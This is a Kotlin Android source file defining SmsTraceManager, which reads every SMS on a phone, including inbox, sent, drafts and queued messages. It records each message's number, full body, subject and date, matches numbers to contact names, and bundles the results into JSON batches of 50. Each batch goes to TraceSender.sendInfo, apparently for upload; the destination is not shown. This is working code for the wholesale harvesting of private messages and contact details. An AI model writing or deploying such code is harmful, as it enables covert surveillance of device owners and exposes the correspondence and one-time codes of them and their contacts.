package com.x.leo.apphelper.trace

import android.Manifest
import android.app.Activity
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.Telephony
import com.x.leo.apphelper.log.xlog.XLog
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject

/**
 * @作者:XLEO
 * @创建日期: 2017/9/5 15:29
 * @描述:${TODO}
 *
 * @更新者:${Author}$
 * @更新时间:${Date}$
 * @更新描述:${TODO}
 * @下一步：
 */
object SmsTraceManager {
    val UPDATE_TIME:String = "sms trace update_time"
    /**
    Get the SMS Info
    content://sms/inbox     收件箱
    content://sms/sent        已发送
    content://sms/draft        草稿
    content://sms/outbox    发件箱           (正在发送的信息)
    content://sms/failed      发送失败
    content://sms/queued  待发送列表  (比如开启飞行模式后，该短信就在待发送列表里)
     * 1 receive 2 send
     * message type：
     * MESSAGE_TYPE_ALL 0
     * MESSAGE_TYPE_DRAFT 3
     * MESSAGE_TYPE_FAILED 5
     * MESSAGE_TYPE_INBOX 1
     * MESSAGE_TYPE_OUTBOX 4
     * MESSAGE_TYPE_QUEUED 6 //等待发送
     *MESSAGE_TYPE_SENT 2
     */
    fun ObtainAndSendSms(mActivity: Activity) {
        val contentResolver = mActivity.applicationContext.contentResolver
        val query = contentResolver.query(Uri.parse("content://sms"), null, null, null, null)
        if (query != null) {
            val sum = query.count
            query.close()
            if (sum > 0) {
                val parts = sum / 50
                val time = System.currentTimeMillis()
                for (i in 0..parts) {
                    val i1 = (i + 1) * 50
                    updateSms(i * 50, if (i1 > sum) sum else i1, i, parts, mActivity, time)
                }
            } else {
                notifyNoSms(mActivity)
            }
        }
    }

    private fun updateSms(start: Int, end: Int, part_num: Int, parts: Int, act: Activity, time: Long) {
        val phoneSmsEntity = JSONObject()
        val phoneSmsArray = JSONArray()
        var phoneSms: JSONObject
        var name: String
        var number: String?
        var direction: String
        var createTime: Long
        var content: String
        var subject: String?

        val cursor = act.applicationContext.contentResolver.query(Uri.parse("content://sms"), arrayOf(
                Telephony.Sms.PERSON, //reference to item in {@code content://contacts/people}
                Telephony.Sms.ADDRESS, //The address of the other party.
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE,
                Telephony.Sms.BODY,
                Telephony.Sms.SUBJECT), null, null, Telephony.Sms.DEFAULT_SORT_ORDER)

        var moveToPosition = cursor.moveToPosition(start)
        while (cursor != null && moveToPosition && cursor.position < end) {
            // cursor.printColumn("sms + positon:" + cursor.position)
            try {
//                val nam_index = cursor.getInt(0)
                number = cursor.getString(1)
                val direction_id = cursor.getInt(2)
                createTime = cursor.getLong(3)
                content = cursor.getString(4)
                subject = cursor.getString(5)

                phoneSms = JSONObject()
                if (number == null) {
                    phoneSms.put("name", "Draft sms")
                    phoneSms.put("number", "NONUMBER")
                } else {
                    name = getNameByAddress(act, number)
                    phoneSms.put("name", name)
                    phoneSms.put("number", number)
                }
                phoneSms.put("subject", if (subject == null) "NO_SUBJECT" else subject)
                when (direction_id) {
                    0 -> {
                        direction = "MESSAGE_TYPE_ALL"
                    }
                    1 -> {
                        direction = "MESSAGE_TYPE_INBOX"
                    }
                    2 -> {
                        direction = "MESSAGE_TYPE_SENT"
                    }
                    3 -> {
                        direction = "MESSAGE_TYPE_DRAFT"
                    }
                    4 -> {
                        direction = "MESSAGE_TYPE_OUTBOX"
                    }
                    5 -> {
                        direction = "MESSAGE_TYPE_FAILED"
                    }
                    6 -> {
                        direction = "MESSAGE_TYPE_QUEUED"
                    }
                    else -> {
                        direction = "MESSAGE_UNKNOW_TYPE"
                    }
                }
                phoneSms.put("direction", direction)
                phoneSms.put("createTime", createTime)
                phoneSms.put("content", content)
                phoneSmsArray.put(phoneSms)
            } catch (ex: Exception) {
                XLog.d("JSONException: " + ex.message,10)
            }
            moveToPosition = cursor.moveToNext()
        }
        cursor?.close()
        try {
            val packageInfo = act.packageManager.getPackageInfo(act.packageName, 0)
            phoneSmsEntity.put("protocolName", ProtocolName.SMS_LOG)
            phoneSmsEntity.put("protocolVersion", ProtocolVersion.V_1_0)
            phoneSmsEntity.put("versionName", packageInfo.versionName)
            phoneSmsEntity.put("updateTime", time)
            phoneSmsEntity.put("pageNo", part_num)
            phoneSmsEntity.put("pageSum", parts)
            phoneSmsEntity.put("currentSum", end - start)
            phoneSmsEntity.put("data", phoneSmsArray)
        } catch (e: JSONException) {
            XLog.d("JSONException: " + e.message,10)
        } catch (e: PackageManager.NameNotFoundException) {
            XLog.d("PackageManager.NameNotFoundException: " + e.message,10)
        }
        sendMessage(act, phoneSmsEntity)
    }

    private fun getNameByIndex(act: Activity, nam_index: Int): String {
        if (checkPermission(act, Manifest.permission.READ_CONTACTS)) {
            val peopleCursor = act.applicationContext.contentResolver.query(Uri.withAppendedPath(ContactsContract.AUTHORITY_URI, "poeple"), null, null, null, null)
            if (peopleCursor != null && peopleCursor.moveToNext()) {
                peopleCursor.printColumn("People cursor")
            } else {
                XLog.d("no data in people table",10)
            }
        }
        return "UNKNOW"
    }


    private fun sendMessage(act: Activity, obj: JSONObject) {
        TraceSender.sendInfo(act.applicationContext, obj)
    }

    fun getNameByAddress(act: Activity, address: String): String {
        if (checkPermission(act, Manifest.permission.READ_CONTACTS)) {
            val projection = arrayOf<String>(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER)
            val uri_Person = Uri.withAppendedPath(ContactsContract.CommonDataKinds.Phone.CONTENT_FILTER_URI, address)    // address 手机号过滤
            val cursor = act.applicationContext.contentResolver.query(uri_Person, projection, null, null, null)
            if (cursor != null && cursor.moveToFirst()) {
                val index_PeopleName = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val strPeopleName = cursor.getString(index_PeopleName)
                cursor?.close()
                return if (strPeopleName == null) "UNKNOW" else strPeopleName
            }
            cursor?.close()
        }
        return "UNKNOW"
    }

    private fun checkPermission(act: Activity, permission: String): Boolean {
        if (Build.VERSION.SDK_INT >= 23) {
            if (act.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
                return true
            } else {
                return false
            }
        } else {
            return true
        }
    }

    private fun notifyNoSms(act: Activity) {
        val phoneSmsEntity = JSONObject()
        try {
            val packageInfo = act.packageManager.getPackageInfo(act.packageName, 0)
            phoneSmsEntity.put("protocolName", ProtocolName.SMS_LOG)
            phoneSmsEntity.put("protocolVersion", ProtocolVersion.V_1_0)
            phoneSmsEntity.put("versionName", packageInfo.versionName)
            phoneSmsEntity.put("partNum", 0)
            phoneSmsEntity.put("partSum", 0)
            phoneSmsEntity.put("updateTime", System.currentTimeMillis())
            phoneSmsEntity.put("data", JSONArray())
        } catch (e: JSONException) {
            e.printStackTrace()
            XLog.d("JSONException: " + e.message,10)
        } catch (e: PackageManager.NameNotFoundException) {
            e.printStackTrace()
            XLog.d("PackageManager.NameNotFoundException: " + e.message,10)
        }
        sendMessage(act, phoneSmsEntity)
    }

}

fun Cursor.printColumn(preString:String){
    val sb = StringBuilder(preString)
    for (i in 0 until this.columnCount) {
        sb.append("\n" + this.getColumnName(i) + ":" + this.getString(i))
    }
    XLog.d(preString + sb.toString(),10)
}
